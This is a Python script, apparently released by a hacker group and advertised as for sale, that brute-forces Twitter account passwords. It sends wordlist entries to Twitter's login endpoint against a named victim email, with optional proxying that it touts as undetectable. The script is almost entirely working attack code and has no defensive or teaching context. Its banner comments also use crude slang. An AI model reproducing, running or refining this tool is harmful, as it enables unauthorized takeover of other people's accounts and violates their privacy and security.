#Changing Description won't make you the coder Lammerz ;)#
# [+] Twitter Brute Force [+]
#####################################
#Twitter Pentester  2014 Priv888888 #
#Coded By Mauritania Attacker       #
#This tool is for sale              #
#Verbose Mode added + Proxy Nyggaz  #
#####################################
 
import urllib2, sys, re, urllib, httplib, socket

print "\n################################" 
print "#Twitter Pentester  2014 Priv8 #"
print "#Coded By Mauritania Attacker  #"
print "#Verbose Method + Intrusion    #"
print "#AutoRotating Proxy            #"
print "#Undetectable By Firewall      #"
print "################################"
 
if len(sys.argv) not in [3,4,5,6]:
   print "Usage: twitter.py victim@gmail.com <wordlist.txt> <options>\n"
   print "\t -p : <host:port> : Undetectable Proxy Mode 100%"
   print "\t -v : Verbose Magic Mode  \n"
   sys.exit(1)
 
for arg in sys.argv[1:]:
   if arg.lower() == "-p" or arg.lower() == "-proxy":
      proxy = sys.argv[int(sys.argv[1:].index(arg))+2]
   if arg.lower() == "-v" or arg.lower() == "-verbose":
      verbose = 1
 
try:
   if proxy:
      print "\n[+] Checking the Proxy Nygga :v Wait..."
      h2 = httplib.HTTPConnection(proxy)
      h2.connect()
      print "[+] Proxy:",proxy
except(socket.timeout):
   print "\n[-] Proxy Timed Out"
   proxy = 0
   pass
except(NameError):
   print "\n[-] Proxy Not Given"
   proxy = 0
   pass
except:
   print "\n[-] Proxy Failed"
   proxy = 0
   pass
 
try:
   if verbose == 1:
      print "[+] Verbose Mode On\n"
except(NameError):
   print "[-] Verbose Mode Off\n"
   verbose = 0
   pass
 
host = "https://twitter.com/intent/session/"
print "[+] Attacking with Intelligent Method :",host
print "[+] Victim:",sys.argv[1]
 
try:
     words = open(sys.argv[2], "r").readlines()
     print "[+] Words Loaded:",len(words),"\n"
except(IOError):
     print "[-] Error: Check your wordlist path\n"
     sys.exit(1)
 
for word in words:
   word = word.replace("\r","").replace("\n","")
   login_form_seq = [
   ('session[username_or_email]', sys.argv[1]),
   ('session[password]', word),
   ('remember_me', 'Remember+me'),
   ('commit', 'Sign+in')]
   login_form_data = urllib.urlencode(login_form_seq)
   if proxy != 0:
      proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
      opener = urllib2.build_opener(proxy_handler)
   else:
      opener = urllib2.build_opener()
   try:
      opener.addheaders = [('User-agent', 'Chrome/34.0.1847.116')]
      site = opener.open(host, login_form_data).read()
   except(urllib2.URLError), msg:
      print msg
      site = ""
      pass
 
   if re.search("Please re-enter your Twitter account details and try again.",site) == None:
      print "\n\t[!] Twitter Account Cracked Successfully ^_^ :",sys.argv[1],word,"\n"
      sys.exit(1)
   else:
      if verbose == 1:
         print "[-] Login Failed:",word
print "\n[-] Cracking Done Dear ^_^ \!/ AnonGhost Team \!/ \n"